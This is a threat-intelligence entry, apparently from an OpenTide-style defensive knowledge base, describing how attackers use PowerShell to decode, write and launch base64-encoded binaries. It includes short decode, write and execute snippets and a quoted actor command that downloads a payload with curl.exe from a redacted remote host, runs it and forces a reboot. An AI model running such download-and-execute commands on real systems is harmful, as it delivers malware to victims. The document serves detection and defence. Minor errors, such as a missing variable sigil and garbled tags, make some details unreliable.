

# ☣️ Obfuscate binaries through PowerShell commands

🔥 **Criticality:Medium** ❗ : A Medium priority incident may affect public health or safety, national security, economic security, foreign relations, civil liberties, or public confidence. 

🚦 **TLP:CLEAR** ⚪ : Recipients can spread this to the world, there is no limit on disclosure.


🗡️ **ATT&CK Techniques** [T1190 : Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190 'Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network The weakness in the system can be a s'), [T1027.013 : Obfuscated Files or Information: Encrypted/Encoded File](https://attack.mitre.org/techniques/T1027/013 'Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection Encrypting andor encoding file co'), [T1027.002 : Obfuscated Files or Information: Software Packing](https://attack.mitre.org/techniques/T1027/002 'Adversaries may perform software packing or virtual machine software protection to conceal their code Software packing is a method of compressing or e'), [T1059.001 : Command and Scripting Interpreter: PowerShell](https://attack.mitre.org/techniques/T1059/001 'Adversaries may abuse PowerShell commands and scripts for execution PowerShell is a powerful interactive command-line interface and scripting environm')



---

`🔑 UUID : a3df7d01-5fd9-4522-8eaf-f28895046b7d` **|** `🏷️ Version : 1` **|** `🗓️ Creation Date : 2025-06-12` **|** `🗓️ Last Modification : 2025-06-18` **|** `Sharing Organisation : {'uuid': '56b0a0f0-b0bc-47d9-bb46-02f80ae2065a', 'name': 'EC DIGIT CSOC'}` **|** `🧱 Schema Identifier : tvm::2.1`


## 👁️ Description

> Obfuscating binaries through PowerShell commands is a technique
> used to make it difficult for reverse engineers, malware analysts,
> or security researchers to understand the purpose and behavior of
> a binary or script. This is often used by attackers to evade
> detection and analysis.  
> 
> ### Some of the methods for binary obfuscation
> 
> - ConvertTo-Base64: Converts a string to a Base64-encoded string.
> - Compress-Archive: Compresses a file or folder using Gzip.
> - Invoke-Expression: Executes a string as a PowerShell expression,
> allowing for dynamic code execution.
> - Add-Type: Loads a .NET assembly, which can be used to execute
> code dynamically.
> - Reflection.Assembly: Loads a .NET assembly using reflection.
> 
> For more information, an examples are given in the ref [2], [3], [4].
> 
> ### A process for base64 encoded binary 
> 
> Usually a base64 encoded binary dropped to a computer is achieved
> via a sequence of PowerShell (PS) commands.
> 
> An example for such pattern is represented in several steps below:
> 
> 1. Base64 encoding
> 
> Like a first step, a binary (an executable file, for instance) is encoded 
> in base64. This encoding scheme is used to represent binary data in an ASCII
> string format. This is often done to bypass security controls that might
> block or inspect binary data but allow text.
> 
> 2. Dropping the encoded binary
> 
> The base64 encoded string is then "dropped" onto the target computer.
> This could be done through various means, such as being embedded in a script,
> sent via email, or included in a malicious document that executes PowerShell
> commands when opened.
> 
> 3. Decoding the binary in PowerShell
> 
> Once the encoded string is on the target system, PowerShell can be used to
> decode it. The [System.Convert]::FromBase64String() method in PowerShell is
> used for this purpose.
> 
> Example for PowerShell obfuscation code
> 
> ```
> encodedString = "YOUR_BASE64_ENCODED_STRING_HERE"
> $decodedBytes = [System.Convert]::FromBase64String($encodedString)
> ```
> 
> 4. Saving the decoded Binary to a file
> 
> After decoding, the binary needs to be saved to a file. This can
> be done using the [System.IO.File]::WriteAllBytes() method:
> 
> ```
> $path = "C:\Path\To\Save\YourFile.exe"
> [System.IO.File]::WriteAllBytes($path, $decodedBytes)
> 
> ```
> 5. Executing the binary
> 
> Finally, the saved binary can be executed. One of the methods in which
> the threat actors can do this is directly from PowerShell or through
> other means such as creating a shortcut or using other scripts.
> 
> Example:
> 
> ```
> Start-Process -FilePath $path
> ```
> 
>  Another example for binary obfuscation through PowerShell commands
>  is shown in Chinese-linked cluster threat actor campaign ref [1].  
>  
>  The threat actor group is observed to obfuscate binaries (in particular
>  AppSov.exe) using PowerShell commands.  
> 
>  The threat actor deployed AppSov.exe by executing a PowerShell command
>  that performs the following actions:
> 
>  - A threat actor downloads a binary file named from a remote endpoint
>  using the utility curl.exe
>  - After they save the downloaded file as `AppSov.exe` in the
>  `C:\ProgramData\` directory.
>  - Launches the executable using the `Start-Process` PowerShell command.
>  - System reboot after some period of time. ref [1].      
> 
>  An example for used command:
> 
>  ```
>  sleep 60;curl.exe -o c:\programdata\AppSov.EXE http://[REDACTED]/dompdf/x.dat;start-process c:\programdata\AppSov.EXE;sleep 1800;shutdown.exe -r -t 1 -f;
>  
>  ```
> 



## 🖥️ Terrain 

 > A threat actor needs an initially compromised end-point. 
> Example: A threat actor is using Operational Relay Box (ORB)
> network to gain an initial foothold and access to the victim's
> environment ref [1].
> 

 &nbsp;
### ❤️‍🩹 Common Vulnerability Enumeration

⚠️ ERROR : Could not successfully retrieve CVE Details, double check the broken links below to confirm the CVE ID exists.

- [💔 CVE-2024-8963](https://nvd.nist.gov/vuln/detail/CVE-2024-8963)
- [💔 CVE-2024-8190](https://nvd.nist.gov/vuln/detail/CVE-2024-8190)

&nbsp;

---

## 🕸️ Relations



### 🌊 OpenTide Objects
🚫 No related OpenTide objects indexed.





---

## Model Data

#### **⛓️ Cyber Kill Chain**

 > Cyber attacks are typically phased progressions towards strategic objectives. The Unified Kill Chains provides insight into the tactics that hackers employ to attain these objectives. This provides a solid basis to develop (or realign) defensive strategies to raise cyber resilience.

 [`🏃🏽 Defense Evasion`](https://www.unifiedkillchain.com/assets/The-Unified-Kill-Chain.pdf) : Techniques an attacker may specifically use for evading detection or avoiding other defenses.

---

#### **🛰️ Domains**

 > Infrastructure technologies domain of interest to attackers.

 `🏢 Enterprise` : Generic databases, applications, machines and systems that are usually on premises or on Cloud traditional VMs.

---

#### **🎯 Targets**

 > Granular delimited technical entities holding a value to the organization, that are targeted by adversaries. They might be also involved in the detection coverage as the target of log collection. Partially inspired by Veris.

  - [`👤 Customer`](http://veriscommunity.net/enums.html#section-asset) : People - Customer
 - [`💻 Laptop`](http://veriscommunity.net/enums.html#section-asset) : User Device - Laptop
 - [`🖥️ Workstations`](http://veriscommunity.net/enums.html#section-asset) : Placeholder

---

#### **💿 Platforms concerned**

 > Actual technologies used by the organization that will be exploited by adversaries during a successful attack, and eventually of relevance for detection. Are named by commercial designation.

 ` Windows` : Placeholder

---

#### **💣 Severity**

 > The severity summarizes the overall danger of incident the vector will provoke, and is to be derived (WIP) from impact, leverage, and difficulty to execute.

 [`🧨 Moderate incident`](https://www.ncsc.gov.uk/news/new-cyber-attack-categorisation-system-improve-uk-response-incidents) : A cyber attack on a small organisation, or which poses a considerable risk to a medium-sized organisation, or preliminary indications of cyber activity against a large organisation or the government.

---

#### **🪄 Leverage acquisition**

 > Technical aftermath of the attack from the target perspective, differentiated from impact as it does not consider the value of the consequence, only what increased control the vector execution provides to the adversary.

  - [`💀 Infrastructure Compromise`](https://owasp.org/www-community/Threat_Modeling_Process#stride) : The compromised target is likely to be used to further expand the sphere of influence of the attacker and allow more potent vectors to be executed.
 - [`💅 Elevation of privilege`](https://owasp.org/www-community/Threat_Modeling_Process#stride) : Capacity to augment leverage over the target system by upgrading the compromised access rights
 - [`👁️‍🗨️ Information Disclosure`](https://owasp.org/www-community/Threat_Modeling_Process#stride) : Threat action intending to read a file that one was not granted access to, or to read data in transit.
 - [`🐒 Tampering`](https://owasp.org/www-community/Threat_Modeling_Process#stride) : Threat action intending to maliciously change or modify persistent data, such as records in a database, and the alteration of data in transit between two computers over an open network, such as the Internet.

---

#### **💥 Impact**

 > Analysis of the threat vector from the organizational perspective, in non technical term. This aims at putting a clear denomination on what the attacker will actually be able to act upon if the threat vector is realized.

  - [`🩼 Impairement`](http://veriscommunity.net/enums.html#section-impact) : Incapacitation of a particular key system that will cause disruptions in day-to-day operations, and eventually service delivery.
 - [`🛑 Business disruption`](http://veriscommunity.net/enums.html#section-impact) : Business disruption
 - [`🤬 Lose Capabilities`](http://veriscommunity.net/enums.html#section-impact) : Vector execution will remove key functions to the organization, which will not be easily circumvented. Most day-to-day is heavily impaired, but processes can reorganize at a loss.

---

#### **🎲 Vector Viability**

 > Described with estimative language (likelyhood probability), describes how likely the analyst believes the vector to actually be realized on the organization infrastructure. Estimative language describes quality and credibility of underlying sources, data, and methodologies based Intelligence Community Directive 203 (ICD 203) and JP 2-0, Joint Intelligence.

 [`🧐 Likely`](https://www.dni.gov/files/documents/ICD/ICD%20203%20Analytic%20Standards.pdf) : Probable (probably) - 55-80%

---



### 🔗 References



**🕊️ Publicly available resources**

- [_1_] https://www.sentinelone.com/labs/follow-the-smoke-china-nexus-threat-actors-hammer-at-the-doors-of-top-tier-targets
- [_2_] https://convert.readthedocs.io/en/latest/functions/ConvertTo-Base64
- [_3_] https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.5
- [_4_] https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.5

[1]: https://www.sentinelone.com/labs/follow-the-smoke-china-nexus-threat-actors-hammer-at-the-doors-of-top-tier-targets
[2]: https://convert.readthedocs.io/en/latest/functions/ConvertTo-Base64
[3]: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.5
[4]: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.5

---

#### 🏷️ Tags

#-, #-, #-, #
, #
, ##, ##, ##, ##, # , #🏷, #️, # , #T, #a, #g, #s, #
, #


